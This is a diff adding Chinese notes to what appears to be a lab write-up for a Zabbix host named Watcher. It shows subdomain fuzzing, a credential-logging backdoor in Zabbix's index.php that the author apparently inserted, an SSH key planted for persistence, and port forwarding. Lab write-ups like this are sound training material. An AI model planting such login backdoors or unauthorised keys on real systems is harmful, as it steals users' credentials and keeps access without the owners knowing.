@@ -1,4 +1,41 @@
 ## Watcher
+### 总结 关于网页zabbix --hostid 10084的漏洞
+```
+[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
+
+//index.php后门
+zabbix@watcher:/usr/share/zabbix$ cat index.php
+<SNIP>
+// login via form
+if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
+	CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
+	
+	// Backdoor 手动插入后门好酷
+	  $file = fopen("creds.txt", "a+");
+ 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n");
+ 	header("Location: http://127.0.0.1/index.php");
+ 	fclose($file);	  
+
+	
+	if (CWebUser::$data['autologin'] != $autologin) {
+		API::User()->update([
+			'userid' => CWebUser::$data['userid'],
+			'autologin' => $autologin
+		]);
+	}
+
+//关于私钥
+zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh
+zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N ""
+zabbix@watcher:/var/lib/zabbix$ cd .ssh
+zabbix@watcher:/var/lib/zabbix/.ssh$ ls
+id_rsa	id_rsa.pub
+zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys
+zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
+[★]$ vi id_rs
+[★]$ chmod 600 id_rsa
+[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
+```
 ```
 [★]$ nmap -sC -sV 10.129.234.163
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 07:47 CST
